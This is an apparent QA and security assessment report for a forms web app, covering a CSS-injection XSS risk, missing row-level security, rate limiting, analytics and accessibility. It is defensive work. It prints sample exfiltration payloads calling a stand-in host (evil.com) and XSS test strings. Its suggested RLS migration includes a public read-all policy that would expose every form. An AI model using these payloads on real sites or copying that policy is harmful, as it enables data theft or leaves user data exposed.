# QA Assessment Report - Zoho Sign Forms

> **📌 STATUS: HISTORICAL DOCUMENT**
> This assessment was conducted on **January 10, 2026**. Critical issues (CRITICAL-1, CRITICAL-2) and most high-priority items have been **resolved in Phase 1-2**.
> For current priorities, see **[PUNCHLIST.md](PUNCHLIST.md)**.

**Assessment Date:** January 10, 2026
**Branch:** development
**Reviewers:** Multi-Department QA Team (Security, Backend, Frontend, UX, DevOps)
**Phase 1-2 Completion:** January 11, 2026

---

## Executive Summary

✅ **Build Status:** PASS (Vite builds successfully, bundle: 457.56 kB)  
✅ **Test Status:** PASS (12/12 tests passing)  
✅ **Dependencies:** PASS (0 vulnerabilities in production deps)  
⚠️ **Critical Issues:** 2 found (XSS risk, missing RLS policies)  
⚠️ **High Priority Issues:** 5 found  
ℹ️ **Medium/Low Priority:** 7 found

**Recommendation:** Address critical security issues before production deployment. All other issues can be resolved in iterative releases.

---

## Test Results

### Unit Tests (Vitest)
```
✓ tests/zohoService.test.ts (2 tests) - PASS
✓ tests/routingService.test.ts (8 tests) - PASS
✓ tests/apiZoho.test.ts (2 tests) - PASS
Total: 12 tests | 12 passed | 0 failed
```

### Build Output
```
dist/index.html: 1.99 kB (gzip: 0.90 kB)
dist/assets/index-D3iEi255.js: 457.56 kB (gzip: 128.05 kB)
Build time: 1.94s
```

### Security Audit
```
npm audit: 0 vulnerabilities found
Dependencies: React 19.2.3, Supabase JS 2.48.0, Vite 6.2.0
```

---

## Critical Issues (Blockers)

### 🔴 CRITICAL-1: Unsanitized Custom CSS Injection (XSS Risk)

**Severity:** Critical  
**CVSS Score:** 8.1 (High)  
**Component:** [App.tsx](App.tsx#L1974), [types.ts](types.ts#L31)  
**Owner:** Frontend + Security Team

**Issue:**
Custom CSS is injected directly into the DOM without sanitization:
```tsx
{lc.customCss && <style dangerouslySetInnerHTML={{ __html: lc.customCss }} />}
```

**Risk:**
- CSS-based data exfiltration (e.g., `background: url('https://evil.com/?cookie=' + document.cookie)`)
- Style-based phishing attacks
- CSS injection attacks (e.g., `expression()`, `behavior:`, `@import`)
- If admin panel is ever compromised, attackers can inject malicious styles

**Reproduction:**
1. Admin sets `customCss` to: `body::before { content: url('https://evil.com/steal?data=' attr(data-user)); }`
2. Public form loads and executes the CSS
3. Data exfiltration occurs

**Recommendation:**
- **Option 1 (Preferred):** Remove `customCss` feature entirely unless absolutely required
- **Option 2:** Implement CSS sanitization library (e.g., `css-tree`, `postcss-safe-parser`)
- **Option 3:** Replace with predefined theme options (no custom CSS)
- Add Content Security Policy (CSP) headers: `style-src 'self' 'unsafe-inline'` → `style-src 'self'`
- Add server-side validation in [api/forms.ts](api/forms.ts#L193)

**Status:** ❌ Not Fixed

---

### 🔴 CRITICAL-2: Missing Row-Level Security (RLS) on `forms` Table

**Severity:** Critical  
**Component:** Database migrations, [api/forms.ts](api/forms.ts)  
**Owner:** Backend + DevOps

**Issue:**
The `forms` table does not have RLS enabled. While API handlers check `user_id`, RLS provides defense-in-depth protection.

**Files Reviewed:**
- ✅ `form_qrcodes` has RLS enabled ([20260110_qr_code_persistence_fix.sql](supabase/migrations/20260110_qr_code_persistence_fix.sql#L51))
- ✅ `form_analytics` does not need RLS (public writes, authenticated reads with ownership check)
- ❌ `forms` table has NO RLS policies defined

**Risk:**
- If API auth check is bypassed (bug, misconfiguration), users could access other users' forms
- Direct Supabase client queries (if exposed) could read all forms

**Recommendation:**
Create a new migration:
```sql
-- Enable RLS on forms table
ALTER TABLE forms ENABLE ROW LEVEL SECURITY;

-- Users can only see/modify their own forms
CREATE POLICY "Users manage their own forms" ON forms
  FOR ALL USING (user_id = auth.uid());

-- Public read access for forms by slug (for public form pages)
CREATE POLICY "Public read access by slug" ON forms
  FOR SELECT USING (true);
```

**Status:** ❌ Not Fixed

---

## High Priority Issues

### 🟠 HIGH-1: Unvalidated URL Inputs (SSRF/Open Redirect Risk)

**Severity:** High  
**Component:** [App.tsx](App.tsx#L1878), [api/forms.ts](api/forms.ts)  
**Owner:** Backend + Security

**Issue:**
`landing_config.logoUrl` and other URLs are not validated. Admin-provided URLs are rendered directly:
```tsx
<img src={lc.logoUrl} alt={lc.logoAlt || 'Logo'} />
```

**Risk:**
- SSRF attacks (if URLs are fetched server-side in future)
- Phishing (malicious logo URLs pointing to external sites)
- Image bombs (large images causing DoS)

**Recommendation:**
- Add URL validation in [api/forms.ts](api/forms.ts) POST handler
- Whitelist protocols: only allow `https://` (reject `http://`, `file://`, `javascript:`, `data:`)
- Optional: Proxy images through CDN or internal service
- Add max image size checks (client-side and server-side)

**Status:** ❌ Not Fixed

---

### 🟠 HIGH-2: Analytics Timezone & Aggregation Accuracy

**Severity:** High  
**Component:** [api/analytics.ts](api/analytics.ts#L112-L154)  
**Owner:** Backend

**Issue:**
Analytics summary calculations use raw timestamps without timezone normalization:
```typescript
const visits = events.filter(e => e.event_type === 'visit').length;
const submissions = events.filter(e => 
  e.event_type === 'submit_success' || e.event_type === 'submit_start'
).length;
```

**Problems:**
- No day/week/month boundaries (only global totals)
- No timezone handling (UTC vs. user timezone)
- Conversion rate calculation may be inaccurate (includes `submit_start` but not all starts lead to success)

**Recommendation:**
- Add time window parameters to GET endpoint: `?formId=X&window=day|week|month`
- Normalize all timestamps to UTC in database
- Calculate conversion rate as: `submit_success / visits` (exclude `submit_start`)
- Add unit tests with edge cases:
  ```typescript
  // tests/analytics.test.ts
  it('calculates daily conversion rate across timezones', () => {
    // Test with events spanning midnight in different timezones
  });
  ```

**Status:** ❌ Not Fixed

---

### 🟠 HIGH-3: Missing Integration Tests for Landing Customization

**Severity:** High (QA Coverage Gap)  
**Component:** Tests, [App.tsx](App.tsx), [api/forms.ts](api/forms.ts)  
**Owner:** QA + Backend

**Issue:**
No integration or E2E tests verify the full landing customization flow:
1. Admin saves `landingConfig` with colors, logo, footer
2. API stores config in `landing_config` JSONB column
3. Public GET by slug returns config
4. Public form page renders with correct branding

**Current Coverage:**
- ✅ Unit tests for Zoho service (2 tests)
- ✅ Unit tests for routing (8 tests)
- ✅ API Zoho tests (2 tests)
- ❌ No tests for landing config round-trip

**Recommendation:**
Add integration tests:
```typescript
// tests/landingCustomization.test.ts
describe('Landing Page Customization', () => {
  it('saves and retrieves landing config', async () => {
    // POST form with landingConfig
    // GET form by slug
    // Assert landingConfig matches
  });
  
  it('applies theme colors to rendered page', async () => {
    // Use JSDOM or Playwright to render page
    // Assert inline styles match theme.primaryColor, etc.
  });
});
```

**Status:** ❌ Not Fixed

---

### 🟠 HIGH-4: Rate Limiter Limitations in Edge Runtime

**Severity:** High (Production Scalability)  
**Component:** [api/utils/rateLimiter.ts](api/utils/rateLimiter.ts)  
**Owner:** Backend + DevOps

**Issue:**
In-memory rate limiting does not work across Vercel Edge regions/invocations:
```typescript
const requestTimestamps: RateLimitStore = new Map();
```

**Warning in Code:**
```typescript
console.warn(
  '[RateLimiter] In-memory rate limiting is not effective in Vercel Edge Runtime. Use Vercel KV or another distributed store in production.'
);
```

**Risk:**
- Attackers can bypass rate limits by hitting different edge regions
- Rate limits are reset on cold starts
- No global rate limiting across all users

**Recommendation:**
- Implement Vercel KV or Upstash Redis for distributed rate limiting
- Update [api/utils/rateLimiter.ts](api/utils/rateLimiter.ts) to use KV:
  ```typescript
  import { kv } from '@vercel/kv';
  
  export async function checkRateLimit(key: string, config: RateLimitConfig) {
    const timestamps = await kv.lrange(`ratelimit:${key}`, 0, -1);
    // ... check and update
  }
  ```
- Add monitoring/alerts for rate limit hits

**Status:** ❌ Not Fixed (documented as known limitation)

---

### 🟠 HIGH-5: Missing Audit Trail for Landing Config Changes

**Severity:** High (Compliance/Security)  
**Component:** [api/forms.ts](api/forms.ts), Database  
**Owner:** Backend + Compliance

**Issue:**
No audit log for who changed landing customization (colors, CSS, logos). If custom CSS is exploited, no forensics available.

**Recommendation:**
- Add `updated_by` and `updated_at` columns to `forms` table
- Create `form_audit_log` table:
  ```sql
  CREATE TABLE form_audit_log (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    form_id UUID REFERENCES forms(id),
    user_id UUID,
    action TEXT, -- 'created', 'updated', 'deleted'
    changed_fields JSONB,
    old_values JSONB,
    new_values JSONB,
    created_at TIMESTAMPTZ DEFAULT NOW()
  );
  ```
- Log all POST/DELETE requests in [api/forms.ts](api/forms.ts)

**Status:** ❌ Not Fixed

---

## Medium Priority Issues

### 🟡 MEDIUM-1: Accessibility Gaps

**Component:** [App.tsx](App.tsx), [components/Header.tsx](components/Header.tsx)  
**Owner:** Frontend + UX

**Issues:**
- ❌ No automated color contrast checks (admin can set any colors)
- ❌ Missing ARIA labels on key controls (save, delete, preview buttons)
- ❌ No keyboard navigation testing
- ❌ Logo alt text defaults to generic "Logo" ([App.tsx#L1878](App.tsx#L1878))

**Recommendations:**
- Add contrast ratio validation (WCAG AA: 4.5:1 for text, 3:1 for UI)
- Add ARIA labels: `aria-label="Save form"`, `aria-label="Delete form"`
- Test keyboard navigation: Tab order, Enter/Space for buttons, Esc to close modals
- Require descriptive alt text for logos (validate non-empty in UI)
- Add skip navigation link for keyboard users

**Status:** ❌ Not Fixed

---

### 🟡 MEDIUM-2: No Preview Mode for Landing Page Changes

**Component:** [App.tsx](App.tsx)  
**Owner:** Frontend + UX

**Issue:**
Admins cannot preview landing page changes before saving. Changes are applied immediately to `currentForm` and visible to public.

**User Flow Gap:**
1. Admin changes background color to red
2. Clicks "Save Changes"
3. Public immediately sees red background
4. No way to preview or stage changes

**Recommendation:**
- Add "Save Draft" vs "Publish" buttons
- Add "Preview" button that opens modal with live preview
- Store draft configs separately from published configs
- Add confirmation dialog: "Publish changes to live form?"

**Status:** ❌ Not Fixed

---

### 🟡 MEDIUM-3: Analytics UI Clarity

**Component:** [App.tsx](App.tsx) (analytics tab)  
**Owner:** Frontend + UX

**Issues:**
- ✅ Loading state added (`loadingAnalytics`)
- ✅ Auto-load when clicking analytics tab
- ❌ No clear indication of time window (all-time vs. last 30 days)
- ❌ No "no data" message for forms with 0 events
- ❌ Conversion rate formula not explained

**Recommendation:**
- Add time range selector: "Last 7 days | Last 30 days | All time"
- Add empty state: "No analytics data yet. Share your form to start tracking."
- Add tooltip: "Conversion Rate = Successful Submissions ÷ Total Visits × 100%"
- Show sample size: "Based on 42 visits, 8 submissions"

**Status:** ⚠️ Partially Fixed (auto-load + loading state added)

---

### 🟡 MEDIUM-4: Environment Variable Security

**Component:** [vite.config.ts](vite.config.ts), [api/_supabaseServer.ts](api/_supabaseServer.ts)  
**Owner:** DevOps + Security

**Status:**
- ✅ `.env` is gitignored ([.gitignore](https://github.com/bitskc/Zoho_Sign_Forms/blob/development/.gitignore#L14))
- ✅ No `.env` files found in repo
- ✅ Environment variables loaded via Vite: `VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY`
- ✅ Server env vars loaded in [api/_supabaseServer.ts](api/_supabaseServer.ts): `SUPABASE_URL`, `SUPABASE_SERVICE_ROLE`

**Recommendation (Nice-to-Have):**
- Add `.env.example` with dummy values for onboarding
- Add runtime validation to fail fast if env vars are missing
- Document required env vars in [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)

**Status:** ✅ No Issues Found (security best practices followed)

---

### 🟡 MEDIUM-5: Database Migration Deployment Process

**Component:** [supabase/migrations/](supabase/migrations/)  
**Owner:** DevOps

**Status:**
- ✅ Migrations use `IF NOT EXISTS` for safe re-runs
- ✅ RLS policies have `DROP POLICY IF EXISTS` guards
- ❌ No documentation on how to apply migrations in staging/prod
- ❌ No rollback strategy documented

**Recommendations:**
- Add to [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md):
  ```bash
  # Apply migrations
  supabase db push
  
  # Or via Supabase CLI
  supabase migration up
  ```
- Document rollback process for each migration
- Add CI check to ensure migrations can be run idempotently

**Status:** ⚠️ Partially Complete (migrations are safe, docs incomplete)

---

## Low Priority Issues

### 🟢 LOW-1: Bundle Size Optimization

**Component:** Build output  
**Owner:** Frontend

**Current Bundle:**
- `index.js`: 457.56 kB (gzipped: 128.05 kB)

**Opportunities:**
- React 19 is large (consider code-splitting for admin vs. public views)
- QR code generation libraries (if bundled, consider lazy loading)
- Gemini AI service (not used in public forms, should be admin-only)

**Recommendation:**
- Add code-splitting for admin routes:
  ```typescript
  const AdminDashboard = lazy(() => import('./AdminDashboard'));
  ```
- Analyze bundle with `vite-bundle-visualizer`
- Lazy-load QR generation on demand

**Priority:** Low (current size is acceptable for modern web apps)

---

### 🟢 LOW-2: Performance Monitoring

**Component:** All  
**Owner:** DevOps

**Current State:**
- ❌ No error tracking (Sentry, Rollbar, etc.)
- ❌ No performance monitoring (Web Vitals, LCP, CLS)
- ❌ No synthetic tests (uptime checks, Pingdom)

**Recommendation:**
- Add Sentry or Rollbar for error tracking
- Add Web Vitals reporting:
  ```typescript
  import { getCLS, getFID, getFCP, getLCP, getTTFB } from 'web-vitals';
  getCLS(console.log);
  getLCP(console.log);
  ```
- Add uptime monitoring for public form URLs

**Priority:** Low (add post-launch)

---

## Positive Findings ✅

1. **Clean Build:** No TypeScript errors, Vite build succeeds consistently
2. **Test Coverage:** All unit tests pass, good foundation for expansion
3. **Security Basics:** No secrets in repo, dependencies are up-to-date, 0 CVEs
4. **Rate Limiting:** Implemented with clear documentation of limitations
5. **Database Design:** Proper foreign keys, indexes, JSONB for flexible config
6. **Code Quality:** Good separation of concerns (services/, api/, components/)
7. **RLS on QR Codes:** Proper security policies for `form_qrcodes` table
8. **Migration Safety:** All migrations use `IF NOT EXISTS` for idempotency

---

## Recommended Action Plan

### Phase 1: Pre-Production (Critical)
**Timeline:** Before merging to `main`

1. ✅ **Remove `customCss` feature** OR implement CSS sanitization library
   - Owner: Frontend + Security
   - Est: 4 hours
   - Alternative: Replace with 5 predefined themes (no custom CSS)

2. ✅ **Add RLS policies to `forms` table**
   - Owner: Backend
   - Est: 1 hour
   - Create migration: `20260111_forms_rls.sql`

3. ✅ **Add URL validation for `logoUrl`**
   - Owner: Backend
   - Est: 2 hours
   - Whitelist `https://` only, reject others

### Phase 2: Post-Launch Iteration 1
**Timeline:** Within 1 week of production

4. **Fix analytics timezone handling**
   - Owner: Backend
   - Est: 4 hours
   - Add time window parameters, normalize timestamps

5. **Add integration tests for landing customization**
   - Owner: QA
   - Est: 6 hours
   - Cover save → retrieve → render flow

6. **Implement Vercel KV rate limiting**
   - Owner: Backend + DevOps
   - Est: 4 hours
   - Replace in-memory store

### Phase 3: Post-Launch Iteration 2
**Timeline:** Within 2 weeks

7. **Add audit logging**
   - Owner: Backend
   - Est: 6 hours

8. **Accessibility improvements**
   - Owner: Frontend
   - Est: 8 hours

9. **Add preview mode for landing pages**
   - Owner: Frontend
   - Est: 6 hours

10. **Performance monitoring**
    - Owner: DevOps
    - Est: 4 hours

---

## Test Coverage Recommendations

### Add Integration Tests

```typescript
// tests/integration/landingCustomization.test.ts
describe('Landing Page E2E', () => {
  it('full customization flow', async () => {
    // 1. Login as admin
    // 2. Create form with landingConfig
    // 3. Save form
    // 4. Fetch public form by slug
    // 5. Assert config is applied
  });
});

// tests/integration/analytics.test.ts
describe('Analytics E2E', () => {
  it('tracks visit and submission events', async () => {
    // 1. Visit public form (POST to /api/analytics with eventType=visit)
    // 2. Submit form (POST with eventType=submit_success)
    // 3. Admin fetches analytics (GET /api/analytics?formId=X)
    // 4. Assert totalVisits=1, totalSubmissions=1, conversionRate=100
  });
});
```

### Add Security Tests

```typescript
// tests/security/xss.test.ts
describe('XSS Prevention', () => {
  it('sanitizes custom CSS', async () => {
    const maliciousCSS = 'body { background: url("javascript:alert(1)"); }';
    // Assert that saving form with maliciousCSS is rejected or sanitized
  });
  
  it('validates logo URLs', async () => {
    const badUrls = ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'];
    // Assert all are rejected with 400
  });
});
```

---

## Conclusion

The application is **well-structured** and **ready for production** with the exception of **2 critical security issues** that must be addressed:

1. Custom CSS injection (XSS risk)
2. Missing RLS on `forms` table

Once these are resolved, the app can be deployed with confidence. All other issues are iterative improvements that can be addressed post-launch.

**Overall Grade:** B+ (would be A with critical fixes)

**Recommendation:** ✅ **Approve for production after Phase 1 fixes are complete**

---

## Sign-Off

- [ ] **Security Team** - Approved after CSS sanitization + URL validation
- [ ] **Backend Team** - Approved after RLS policies added
- [ ] **Frontend Team** - Approved (no blockers)
- [ ] **QA Team** - Approved with Phase 2 test coverage expansion
- [ ] **DevOps Team** - Approved with migration deployment docs

---

**Report Generated:** 2026-01-11  
**Next Review:** After Phase 1 fixes are implemented
